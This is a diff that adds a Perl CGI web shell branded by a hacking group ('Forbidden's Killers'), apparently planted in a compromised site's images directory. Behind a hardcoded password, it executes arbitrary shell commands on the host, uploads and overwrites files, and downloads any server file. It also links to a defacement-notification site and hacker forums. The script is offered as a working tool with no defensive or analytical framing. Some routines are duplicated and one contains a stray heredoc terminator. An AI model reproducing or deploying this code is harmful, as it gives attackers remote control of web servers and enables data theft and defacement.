@@ -1,0 +1,829 @@
+#!/usr/bin/perl -I/home/web1661/public_html/a/up/styles/alhjer/images/403.sa
+#------------------------------------------------------------------------------
+# Copyright (C) 2010 FoRB!ddeN's KiLLeRs
+#
+# EdiT3R: mr.FeelinG
+# EdiT3R e-mail: deaa_alro7@yahoo.com
+# Author Homepage: www.hack-school.com/vb
+# My Group : Forbidden's Killers
+# Greetz : ABO adaai - MooT HaCkEr - NaiF KSA
+#------------------------------------------------------------------------------
+$Password = "nox";	
+
+
+$WinNT = 0;			
+
+$NTCmdSep = "&";
+
+$UnixCmdSep = ";";
+
+$CommandTimeoutDuration = 10;
+
+$ShowDynamicOutput = 1;
+
+
+
+$CmdSep = ($WinNT ? $NTCmdSep : $UnixCmdSep);
+$CmdPwd = ($WinNT ? "cd" : "pwd");
+$PathSep = ($WinNT ? "\\" : "/");
+$Redirector = ($WinNT ? " 2>&1 1>&2" : " 1>&1 2>&1");
+
+
+sub ReadParse 
+{
+	local (*in) = @_ if @_;
+	local ($i, $loc, $key, $val);
+	
+	$MultipartFormData = $ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/;
+
+	if($ENV{'REQUEST_METHOD'} eq "GET")
+	{
+		$in = $ENV{'QUERY_STRING'};
+	}
+	elsif($ENV{'REQUEST_METHOD'} eq "POST")
+	{
+		binmode(STDIN) if $MultipartFormData & $WinNT;
+		read(STDIN, $in, $ENV{'CONTENT_LENGTH'});
+	}
+
+	
+	if($ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/)
+	{
+		$Boundary = '--'.$1; 
+		@list = split(/$Boundary/, $in); 
+		$HeaderBody = $list[1];
+		$HeaderBody =~ /\r\n\r\n|\n\n/;
+		$Header = $`;
+		$Body = $';
+ 		$Body =~ s/\r\n$//; 
+		$in{'filedata'} = $Body;
+		$Header =~ /filename=\"(.+)\"/; 
+		$in{'f'} = $1; 
+		$in{'f'} =~ s/\"//g;
+		$in{'f'} =~ s/\s//g;
+
+		
+		for($i=2; $list[$i]; $i++)
+		{ 
+			$list[$i] =~ s/^.+name=$//;
+			$list[$i] =~ /\"(\w+)\"/;
+			$key = $1;
+			$val = $';
+			$val =~ s/(^(\r\n\r\n|\n\n))|(\r\n$|\n$)//g;
+			$val =~ s/%(..)/pack("c", hex($1))/ge;
+			$in{$key} = $val; 
+		}
+	}
+	else 
+	{
+		@in = split(/&/, $in);
+		foreach $i (0 .. $#in)
+		{
+			$in[$i] =~ s/\+/ /g;
+			($key, $val) = split(/=/, $in[$i], 2);
+			$key =~ s/%(..)/pack("c", hex($1))/ge;
+			$val =~ s/%(..)/pack("c", hex($1))/ge;
+			$in{$key} .= "\0" if (defined($in{$key}));
+			$in{$key} .= $val;
+		}
+	}
+}
+
+sub PrintPageHeader
+{
+	$EncodedCurrentDir = $CurrentDir;
+	$EncodedCurrentDir =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
+	print "Content-type: text/html\n\n";
+	print <<END;
+	
+	
+<html>
+<head>
+<title>-:: Team iraq ::- </title>
+$HtmlMetaHeader
+</head>
+<style>
+BODY { SCROLLBAR-BASE-COLOR: #191919; SCROLLBAR-ARROW-COLOR: olive; }
+textarea{background-color:#191919;color:red;font-weight:bold;font-size: 12px;font-family: Tahoma; border: 1px solid #666666;}
+input{FONT-WEIGHT:normal;background-color: #191919;font-size: 13px;font-weight:bold;color: red; font-family: Tahoma; border: 1px solid #666666;height:17}
+</style>
+<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="82" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
+	<tr>
+<td bgcolor="#808080" bordercolor="#990000" align="center" width="48%" height="32">
+	<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
+	<font color="#990000"><span style="font-weight: 700">--[</span></font><font color="#FFFF00"><span style="font-weight: 700"> 
+	F0rB!ddeN's K!LLeRs Mr.FeelinG</span></font><span style="color: #DADADA; font-weight: 700"> 
+	</span><font color="#990000">
+	<span style="font-weight: 700">|</span></font><span style="color: #DADADA; font-weight: 700">
+	</span>
+	<font color="#00FF00"><span style="font-weight: 700">
+	P3rL 1.0</span></font><span style="color: #DADADA; font-weight: 700">
+	</span>
+	<span style="color: #990000; font-weight: 700">]--</span></td>
+	</tr>
+	<tr>
+	<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
+	<td width="48%" height="51" valign="top" style="font-family: verdana; color: #d9d9d9; font-size: 11px" bordercolorlight="#DADADA" bordercolordark="#C0C0C0" bordercolor="#D9D9D9">
+	<p align="center">
+	<b><font color="#FF0000">--[</font><span style="color: #DADADA"> 
+	</span> 
+	<font size="3" color="#FFFF00">connect  To</font><span style="color: #DADADA"> 
+	</span><font color="#FF0000">]</font></b><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><b><font color="#FF0000">-- 
+	<span style="background-color: #C0C0C0">=-=</span> </font>
+	<font style="font-size: 9pt" color="#D9D9D9">--[</font><font color="#FF0000" style="font-size: 9pt">
+			</font>
+	</b>
+			<font style="font-weight: 700; background-color:#000000" color="#FFFFFF" size="3">$ServerName</font><font style="font-size: 9pt; font-weight: 700" color="#D9D9D9">
+			</font>
+	<a bookmark="minipanel" style="font-weight: normal; font-family: verdana; text-decoration: none">
+			<b><font style="font-size: 9pt" color="#D9D9D9">]--</font></b></a></a></a></a></p>
+	<center>
+	<center>
+	<form method="POST">
+		<input type=hidden name=act value="mkfile" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #800000">
+		<input type=hidden name="d" value="<?php echo $dispd; ?>" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #800000">
+	</form></center></center></td></tr></table>
+	<p align="center">
+	<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none; background-color: #C0C0C0" href="$ScriptLocation?a=home">
+	<font color="#990000" face="Verdana" size="2">
+	Home</font></a><font color="#990000" face="Verdana" size="2"> 
+	|  
+	<u><font color="#990000"><span style="background-color: #C0C0C0">
+	<a href="$ScriptLocation?a=kasber"><font color="#990000">c0d3r</font></a></span></font></u> 
+	| <span style="background-color: #C0C0C0"> 
+	<a href="http://www.sa-hacker.com/vb"><font color="#990000">
+	s4-h4ck3r</font></a></span> 
+	| <span style="background-color: #C0C0C0"> <a href="$ScriptLocation?a=zone"><font color="#990000">
+	z0n3-H</font></a></span> 
+	| </font>
+<span style="background-color: #C0C0C0"><font size="2">
+	<a href="http://www.sa-hacker.com/vb/perl"><font face="Verdana" color="#990000">
+	UpGr4d3</font></a></font></span><font size="3" color="#990000" face="Verdana"> 
+	| 
+</font> <font face="Verdana" size="2">
+<a href="$ScriptLocation?a=upload&d=$EncodedCurrentDir"><font color="#990000">
+<span style="background-color: #C0C0C0">UPLOAD</span></font></a><font color="#990000"> 
+	| </font><span style="background-color: #C0C0C0"><a href="$ScriptLocation?a=download&d=$EncodedCurrentDir">
+<font color="#990000">Download</font></a></span><font color="#990000"> | </font>
+<span style="background-color: #C0C0C0">
+<a href="$ScriptLocation?a=logout"><font color="#990000">D!sc0nn3cT</font></a></span></font></p>
+<body onLoad="document.f.@_.focus()" bgcolor="#000000" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0">
+<div align="center">
+	<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="14" width="93%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
+		<tr><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
+			<td width="97%" height="14" valign="top" style="font-family: verdana; color: #d9d9d9; font-size: 11px" bordercolorlight="#DADADA" bordercolordark="#C0C0C0" bordercolor="#D9D9D9">
+<font size="3" color="#00FF00">
+
+END
+}
+
+
+sub PrintLoginScreen
+{
+	$Message = q$</font><font color="#FFFF00" size="3">
+<div align="center">
+	<pre>#-------------------------------------------------------------------------------------------#
+|                                  Forbidden's Killers                                      |
+|                                                                                           |
+|                                          403                                              |
+|                                                                                           |
+|                                     By : Mr.FeelinG                                        |
+|                                                                                           |
+#-------------------------------------------------------------------------------------------#
+|                              WebSite : www.hack-school.com/                               |
+#-------------------------------------------------------------------------------------------#
+|                                                                                           |
+#-------------------------------------------------------------------------------------------#</font></div><font size="3" color="#00FF00">
+
+</html>
+$;
+#'
+	print <<END;
+<code>$Message
+END
+}
+
+sub PrintLoginFailedMessage
+{
+	print <<END;
+<code>
+<p align="center">&nbsp;</p>
+<p align="center"><font color="#FF0000">#</font><font color="#FFFFFF">--------------------------------------------------------------------------------------------------</font><font color="#FF0000">#</font></p>
+<p align="center"><b>
+<font size="6" color="#C0C0C0">OoPs !!! = </font><font size="6" color="#FF0000">Wr0nG P4sSw0rD</font></b></p>
+<p align="center"><b><font size="6" color="#FFFF00">
+Try Again</font></b></p>
+<p align="center"><font color="#FF0000">#</font><font color="#FFFFFF">--------------------------------------------------------------------------------------------------</font><font color="#FF0000">#</font></p>
+<p align="center"><font color="#FFFFFF"><br>
+&nbsp;</font></p>
+</code>
+END
+}
+
+sub PrintLoginForm
+{
+	print <<END;
+<code>
+<body>
+
+<form name="f" method="POST" action="$ScriptLocation">
+<input type="hidden" name="a" value="login">
+<p align="center"><b><font size="3" color="#FF0000">
+I</font><font size="3" color="#C0C0C0">nT</font><font size="3" color="#FF0000">3</font><font size="3" color="#C0C0C0">r 
+Th</font><font size="3" color="#FF0000">3</font><font size="3" color="#C0C0C0"> 
+Pa</font><font size="3" color="#FF0000">SS</font><font size="3" color="#C0C0C0">w</font><font size="3" color="#FF0000">0</font><font size="3" color="#C0C0C0">rD<u><span style="background-color: #333333">
+</span> </u> </font></b>
+</p>
+<p align="center"><font size="3" color="#990000"> &nbsp;</font><input type="password" name="p" size="38"></p>
+<p align="center"><input type="submit" value="Enter">
+</p>
+</form>
+</code>
+END
+}
+
+sub PrintPageFooter
+{
+	print <<END;
+<code>
+<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
+	<td width="50%" height="1" valign="top" style="font-family: verdana; color: #d9d9d9; font-size: 11px">
+	<p align="center"><b>
+	--[ 4<font color="#FF0000">0</font>3 <font color="#FFFFFF">
+	<span lang="en-us">|</span></font> 
+	<a href="www.hack-school.com" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><font color="#FF0000">
+	www.hack-school.com</font></a> <font color="#FFFFFF"><span lang="en-us">|</span></font> 4<font color="#FF0000">0</font>3 ]--</b></td></tr></table>
+</code>
+END
+}
+
+
+sub GetCookies
+{
+	@httpcookies = split(/; /,$ENV{'HTTP_COOKIE'});
+	foreach $cookie(@httpcookies)
+	{
+		($id, $val) = split(/=/, $cookie);
+		$Cookies{$id} = $val;
+	}
+}
+
+sub home
+{
+        &PrintPageHeader("p");
+        &PrintCommandLineInputForm;
+		&PrintPageFooter;
+END
+}
+
+sub zone
+{
+	print <<END;
+<code>
+<p align="center">
+<IFRAME WIDTH="915" HEIGHT="978" SRC="http://www.zone-h.org/notify/single"></IFRAME>
+</p>
+END
+}
+
+sub kasber
+{
+	print <<END;
+<code>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<table border="1" width="100%" cellspacing="0" cellpadding="2" height="59">
+<tr>
+<td bgcolor="#808080" bordercolor="#990000" align="center" width="3%" height="32">
+<table border="1" width="100%" cellspacing="0" cellpadding="2" height="59">
+<tr>
+<td bgcolor="#808080" bordercolor="#990000" align="center" width="3%" height="32">
+<font size="5" color="#C0C0C0"><b>Ed!T c0d3 By Dr.KAsBeR</b></font></td>
+</tr>
+<tr>
+<td bgcolor="#C0C0C0" height="25">
+<p align="center"><b><font size="5" color="#990000">My Email</font><font size="5" color="#808080">
+</font><font size="5" color="#990000"><span style="background-color: #808080">:</span></font><font size="5" color="#808080">
+</font><font size="5" color="#990000">Dr.KAsBeR403 [at] GmaiL [dot] CoM</font></b><p align="center">
+<b>
+<font size="5" color="#666666">Gr33tZ To</font><font size="5" color="#990000">
+<span style="background-color: #808080">:</span> Dr.DaShEr
+<span style="background-color: #808080">+</span> NeX
+<span style="background-color: #808080">+</span> RmZ AlJnOoP</font></b></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+			<p align="center"></p>
+</code>
+END
+}
+
+sub PrintLogoutScreen
+{
+	print "<code>Connection are closed by The Perl</code>";
+}
+
+sub kasber
+{
+	&PrintPageHeader("p");
+	print <<END;
+<code>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<table border="1" width="100%" cellspacing="0" cellpadding="2" height="59">
+<tr>
+<td bgcolor="#808080" bordercolor="#990000" align="center" width="3%" height="32">
+<table border="1" width="100%" cellspacing="0" cellpadding="2" height="59">
+<tr>
+<td bgcolor="#808080" bordercolor="#990000" align="center" width="3%" height="32">
+<font size="5" color="#C0C0C0"><b>Ed!T c0d3 By Dr.KAsBeR</b></font></td>
+</tr>
+<tr>
+<td bgcolor="#C0C0C0" height="25">
+<p align="center"><b><font size="5" color="#990000">My Email</font><font size="5" color="#808080">
+</font><font size="5" color="#990000"><span style="background-color: #808080">:</span></font><font size="5" color="#808080">
+</font><font size="5" color="#990000">Dr.KAsBeR403 [at] GmaiL [dot] CoM</font></b><p align="center">
+<b>
+<font size="5" color="#666666">Gr33tZ To</font><font size="5" color="#990000">
+<span style="background-color: #808080">:</span> Dr.DaShEr
+<span style="background-color: #808080">+</span> NeX
+<span style="background-color: #808080">+</span> RmZ AlJnOoP</font></b></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+</code>
+END
+}
+
+
+sub zone
+{
+	&PrintPageHeader("p");
+	print <<END;
+<code>
+<p align="center">
+<IFRAME WIDTH="915" HEIGHT="978" SRC="http://www.zone-h.org/notify/single"></IFRAME>
+</p>
+</code>
+END
+}
+
+sub PerformLogout
+{
+	print "Set-Cookie: SAVEDPWD=;\n"; 
+	&PrintPageHeader("p");
+	&PrintLogoutScreen;
+	&PrintLoginScreen;
+	&PrintLoginForm;
+	&PrintPageFooter;
+}
+
+
+sub PerformLogin 
+{
+	if($LoginPassword eq $Password) 
+	{
+		print "Set-Cookie: SAVEDPWD=$LoginPassword;\n";
+		&PrintPageHeader("c");
+		&PrintCommandLineInputForm;
+		&PrintPageFooter;
+	}
+	else # password didn't match
+	{
+		&PrintPageHeader("p");
+		&PrintLoginScreen;
+		if($LoginPassword ne "") 
+		{
+			&PrintLoginFailedMessage;
+		}
+		&PrintLoginForm;
+		&PrintPageFooter;
+	}
+}
+
+
+sub PrintCommandLineInputForm
+{
+	$Prompt = $WinNT ? "$CurrentDir> " : "[403\@$ServerName $CurrentDir]\$ ";
+	print <<END;
+<code>
+<form name="f" method="POST" action="$ScriptLocation">
+<input type="hidden" name="a" value="command">
+<input type="hidden" name="d" value="$CurrentDir">
+<p align="center">&nbsp;</p>
+</font>
+<p align="center"><font size="3" color="#00FF00">
+
+<font color="#FFFF00">$Prompt</font>
+<input type="text" name="c" size="40">
+</p>
+<p align="center">
+<input type="submit" value="Enter">
+</p>
+</form>
+</code>
+END
+}
+
+
+sub PrintFileDownloadForm
+{
+	$Prompt = $WinNT ? "$CurrentDir> " : "[403\@$ServerName $CurrentDir]\$ ";
+	print <<END;
+<code>
+<body>
+
+<form name="f" method="POST" action="$ScriptLocation">
+<input type="hidden" name="d" value="$CurrentDir">
+<input type="hidden" name="a" value="download">
+</font><font size="3" color="#FF0000">
+
+<p align="center">$Prompt download</font><font size="3" color="#00FF00"><br><br>
+</font><font size="3" color="#FFFF00">
+
+Filename:</font><font size="3" color="#00FF00">
+
+<input type="text" name="f" size="35"><br><br>
+</font><font size="3" color="#FFFFFF">
+
+Download:</font><font size="3" color="#00FF00">
+
+<input type="submit" value="Begin">
+</p>
+</form>
+</code>
+END
+}
+
+
+sub PrintFileUploadForm
+{
+	$Prompt = $WinNT ? "$CurrentDir> " : "[403\@$ServerName $CurrentDir]\$ ";
+	print <<END;
+<code>
+</font><font size="3" color="#FF0000">
+
+<form name="f" enctype="multipart/form-data" method="POST" action="$ScriptLocation">
+<p align="center">$Prompt upload</font><font size="3" color="#00FF00"><br><br>
+</font><font size="3" color="#FFFF00">
+
+Filename:</font><font size="3" color="#00FF00">
+
+<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
+<input type="file" name="f0" size="35"></a><br><br>
+Options: &nbsp;<input type="checkbox" name="o" value="overwrite" checked>
+</font><font size="3" color="#FFFF00">
+
+Overwrite if it Exists</font><font size="3" color="#00FF00"><br><br>
+</font><font size="3" color="#FFFFFF">
+
+Upload:</font><font size="3" color="#00FF00">&nbsp;&nbsp;&nbsp;<input type="submit" value="Begin">
+<input type="hidden" name="d" value="$CurrentDir">
+<input type="hidden" name="a" value="upload">
+</p>
+</form>
+</code>
+END
+}
+
+
+sub CommandTimeout
+{
+	if(!$WinNT)
+	{
+		alarm(0);
+		print <<END;
+</xmp>
+<code>
+Command exceeded maximum time of $CommandTimeoutDuration second(s).
+<br>Killed it!
+<code>
+END
+		&PrintCommandLineInputForm;
+		&PrintPageFooter;
+		exit;
+	}
+}
+
+
+sub ExecuteCommand
+{
+	if($RunCommand =~ m/^\s*cd\s+(.+)/) 
+	{
+		# we change the directory internally. The output of the
+		# command is not displayed.
+		
+		$OldDir = $CurrentDir;
+		$Command = "cd \"$CurrentDir\"".$CmdSep."cd $1".$CmdSep.$CmdPwd;
+		chop($CurrentDir = `$Command`);
+		&PrintPageHeader("c");
+		$Prompt = $WinNT ? "$OldDir> " : "[403\@$ServerName $OldDir]\$ ";
+		print "<code>$Prompt $RunCommand</code>";
+	}
+	else # some other command, display the output
+	{
+		&PrintPageHeader("c");
+		$Prompt = $WinNT ? "$CurrentDir> " : "[403\@$ServerName $CurrentDir]\$ ";
+		print "<code>$Prompt $RunCommand</code><xmp>";
+		$Command = "cd \"$CurrentDir\"".$CmdSep.$RunCommand.$Redirector;
+		if(!$WinNT)
+		{
+			$SIG{'ALRM'} = \&CommandTimeout;
+			alarm($CommandTimeoutDuration);
+		}
+		if($ShowDynamicOutput) 
+		{
+			$|=1;
+			$Command .= " |";
+			open(CommandOutput, $Command);
+			while(<CommandOutput>)
+			{
+				$_ =~ s/(\n|\r\n)$//;
+				print "$_\n";
+			}
+			$|=0;
+		}
+		else 
+		{
+			print `$Command`;
+		}
+		if(!$WinNT)
+		{
+			alarm(0);
+		}
+		print "</xmp>";
+	}
+	&PrintCommandLineInputForm;
+	&PrintPageFooter;
+}
+
+
+
+sub PrintDownloadLinkPage
+{
+	local($FileUrl) = @_;
+	if(-e $FileUrl) 
+	{
+
+		$FileUrl =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
+		$DownloadLink = "$ScriptLocation?a=download&f=$FileUrl&o=go";
+		$HtmlMetaHeader = "<meta HTTP-EQUIV=\"Refresh\" CONTENT=\"1; URL=$DownloadLink\">";
+		&PrintPageHeader("c");
+		print <<END;
+<code>
+<p align="center">Sending File $TransferFile...<br>
+If the download does not start automatically,
+<a href="$DownloadLink">Click Here</a>.</p>
+</code>
+END
+		&PrintCommandLineInputForm;
+		&PrintPageFooter;
+	}
+	else # file doesn't exist
+	{
+		&PrintPageHeader("f");
+		print "<code>Failed to download $FileUrl: $!</code>";
+		&PrintFileDownloadForm;
+		&PrintPageFooter;
+	}
+}
+
+sub SendFileToBrowser
+{
+	local($SendFile) = @_;
+	if(open(SENDFILE, $SendFile)) 
+	{
+		if($WinNT)
+		{
+			binmode(SENDFILE);
+			binmode(STDOUT);
+		}
+		$FileSize = (stat($SendFile))[7];
+		($Filename = $SendFile) =~  m!([^/^\\]*)$!;
+		print "Content-Type: application/x-unknown\n";
+		print "Content-Length: $FileSize\n";
+		print "Content-Disposition: attachment; filename=$1\n\n";
+		print while(<SENDFILE>);
+		close(SENDFILE);
+	}
+	else 
+	{
+		&PrintPageHeader("f");
+		print "<code>Failed to download $SendFile: $!</code>";
+		&PrintFileDownloadForm;
+		&PrintPageFooter;
+	}
+}
+
+
+
+sub BeginDownload
+{
+
+	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) |
+		(!$WinNT & ($TransferFile =~ m/^\//))) # path is absolute
+	{
+		$TargetFile = $TransferFile;
+	}
+	else 
+	{
+		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
+		$TargetFile .= $PathSep.$TransferFile;
+	}
+
+	if($Options eq "go") 
+	{
+		&SendFileToBrowser($TargetFile);
+	}
+	else 
+	{
+		&PrintDownloadLinkPage($TargetFile);
+	}
+}
+
+sub UploadFile
+{
+	
+	if($TransferFile eq "")
+	{
+		&PrintPageHeader("f");
+		&PrintFileUploadForm;
+		&PrintPageFooter;
+		return;
+	}
+	&PrintPageHeader("c");
+
+	
+	print "<code>Uploading $TransferFile to $CurrentDir...<br>";
+
+
+	chop($TargetName) if ($TargetName = $CurrentDir) =~ m/[\\\/]$/;
+	$TransferFile =~ m!([^/^\\]*)$!;
+	$TargetName .= $PathSep.$1;
+
+	$TargetFileSize = length($in{'filedata'});
+
+	if(-e $TargetName && $Options ne "overwrite")
+	{
+		print "Failed: Destination file already exists.<br>";
+	}
+	else # file is not present
+	{
+		if(open(UPLOADFILE, ">$TargetName"))
+		{
+			binmode(UPLOADFILE) if $WinNT;
+			print UPLOADFILE $in{'filedata'};
+			close(UPLOADFILE);
+			print "Transfered $TargetFileSize Bytes.<br>";
+			print "File Path: $TargetName<br>";
+		}
+		else
+		{
+			print "Failed: $!<br>";
+		}
+	}
+	print "</code>";
+	&PrintCommandLineInputForm;
+	&PrintPageFooter;
+}
+
+sub UploadFile
+{
+	
+	if($TransferFile eq "")
+	{
+		&PrintPageHeader("f");
+		&PrintFileUploadForm;
+		&PrintPageFooter;
+		return;
+	}
+	&PrintPageHeader("c");
+
+	
+	print "<code>Uploading $TransferFile to $CurrentDir...<br>";
+
+
+	chop($TargetName) if ($TargetName = $CurrentDir) =~ m/[\\\/]$/;
+	$TransferFile =~ m!([^/^\\]*)$!;
+	$TargetName .= $PathSep.$1;
+
+	$TargetFileSize = length($in{'filedata'});
+
+	if(-e $TargetName && $Options ne "overwrite")
+	{
+		print "Failed: Destination file already exists.<br>";
+	}
+	else # file is not present
+	{
+		if(open(UPLOADFILE, ">$TargetName"))
+		{
+			binmode(UPLOADFILE) if $WinNT;
+			print UPLOADFILE $in{'filedata'};
+			close(UPLOADFILE);
+			print "Transfered $TargetFileSize Bytes.<br>";
+			print "File Path: $TargetName<br>";
+		}
+		else
+		{
+			print "Failed: $!<br>";
+		}
+	}
+	print "</code>";
+	&PrintCommandLineInputForm;
+	&PrintPageFooter;
+}
+
+
+sub DownloadFile
+{
+
+	if($TransferFile eq "")
+	{
+		&PrintPageHeader("f");
+		&PrintFileDownloadForm;
+		&PrintPageFooter;
+		return;
+	}
+	
+
+	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) |
+		(!$WinNT & ($TransferFile =~ m/^\//))) 
+	{
+		$TargetFile = $TransferFile;
+	}
+	else 
+	{
+		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
+		$TargetFile .= $PathSep.$TransferFile;
+	}
+
+	if($Options eq "go") 
+	{
+		&SendFileToBrowser($TargetFile);
+	}
+	else 
+	{
+		&PrintDownloadLinkPage($TargetFile);
+	}
+}
+
+
+&ReadParse;
+&GetCookies;
+
+$ScriptLocation = $ENV{'SCRIPT_NAME'};
+$ServerName = $ENV{'SERVER_NAME'};
+$LoginPassword = $in{'p'};
+$RunCommand = $in{'c'};
+$TransferFile = $in{'f'};
+$Options = $in{'o'};
+
+$Action = $in{'a'};
+$Action = "login" if($Action eq ""); 
+
+
+$CurrentDir = $in{'d'};
+chop($CurrentDir = `$CmdPwd`) if($CurrentDir eq "");
+
+$LoggedIn = $Cookies{'SAVEDPWD'} eq $Password;
+
+if($Action eq "login" || !$LoggedIn) 
+{
+	&PerformLogin;
+}
+elsif($Action eq "command") 
+{
+	&ExecuteCommand;
+}
+elsif($Action eq "upload") 
+{
+	&UploadFile;
+}
+elsif($Action eq "download") 
+{
+	&DownloadFile;
+} 
+elsif($Action eq "kasber") 
+{
+	&kasber;
+}
+elsif($Action eq "zone") 
+{
+	&zone;
+}
+elsif($Action eq "home") 
+{
+	&home;
+}
+elsif($Action eq "logout") 
+{
+	&PerformLogout;
+}
